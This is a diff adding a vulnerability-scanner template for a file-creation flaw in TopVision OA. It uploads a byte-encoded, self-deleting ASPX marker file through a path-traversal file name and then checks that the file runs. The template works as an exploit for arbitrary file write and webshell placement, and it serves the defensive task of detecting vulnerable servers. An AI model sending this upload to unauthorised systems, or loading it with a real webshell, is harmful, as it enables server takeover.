@@ -1,0 +1,48 @@
+id: topvision-oa-uploadfile
+
+info:
+  name: TopVision OA UploadFile File Creation
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    TopVision OA has a file creation vulnerability that can be exploited by uploading a malicious file (e.g., a webshell). Attackers can use this to gain unauthorized access to server resources.
+  reference:
+    - http://www.its365.net/products.aspx/
+  tags: file-creation,webshell
+
+variables:
+  cmd: "whoami"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/api/files/UploadFile"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      token=zxh&FileName=/../../manager/z.aspx&pathType=1&fs=[60,37,64,80,97,103,101,32,76,97,110,103,117,97,103,101,61,34,67,35,34,37,62,10,60,37,10,82,101,115,112,111,110,115,101,46,87,114,105,116,101,40,70,111,114,109,115,65,117,116,104,101,110,116,105,99,97,116,105,111,110,46,72,97,115,104,80,97,115,115,119,111,114,100,70,111,114,83,116,111,114,105,110,103,73,110,67,111,110,102,105,103,70,105,108,101,40,34,116,101,115,116,49,50,51,34,44,32,34,77,68,53,34,41,41,59,10,83,121,115,116,101,109,46,73,79,46,70,105,108,101,46,68,101,108,101,116,101,40,82,101,113,117,101,115,116,46,80,104,121,115,105,99,97,108,80,97,116,104,41,59,10,37,62]
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "success"
+
+  - id: shell-access
+    method: GET
+    path:
+      - "{{BaseURL}}/z.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "CC03E747A6AFBBCBF8BE7668ACFEBEE5"
